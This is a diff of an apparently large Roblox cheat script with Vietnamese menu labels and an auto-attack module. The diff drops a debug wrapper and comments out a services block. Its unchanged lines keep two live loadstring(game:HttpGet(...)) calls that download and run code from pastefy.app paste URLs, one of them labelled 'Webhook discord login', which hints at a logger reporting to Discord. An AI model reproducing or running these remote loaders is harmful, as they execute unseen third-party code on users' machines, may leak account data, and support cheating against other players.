@@ -1,19 +1,4 @@
--- Debug Wrapper
-local function RunWithDebug(func)
-    local function ErrorHandler(err)
-        warn("========== SCRIPT ERROR ==========")
-        warn("Error:", err)
-        warn("Stack Trace:")
-        warn(debug.traceback())
-        warn("==================================")
-    end
 
-    local ok = xpcall(func, ErrorHandler)
-
-    if ok then
-        print("Script executed successfully!")
-    end
-end
 loadstring(game:HttpGet("https://pastefy.app/AM25eAps/raw"))()
 --Webhook discord login
 loadstring(game:HttpGet'https://pastefy.app/3S6JPfFI/raw')()
@@ -4900,7 +4885,7 @@ Setting:AddButton({
 --------------------------------------------------------------------
 -- SERVICES
 --------------------------------------------------------------------
-local Players = game:GetService("Players")
+--[[ local Players = game:GetService("Players")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 
 local player = Players.LocalPlayer
@@ -5326,7 +5311,7 @@ Setting:AddToggle({
 
 	end
 
-})
+}) ]]
 Setting:AddToggle({
 	Name = "Tự tấn công",
 	Description = "",
@@ -12952,7 +12937,7 @@ end
 
 
 
-local FastAttackModule = {}
+ local FastAttackModule = {}
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
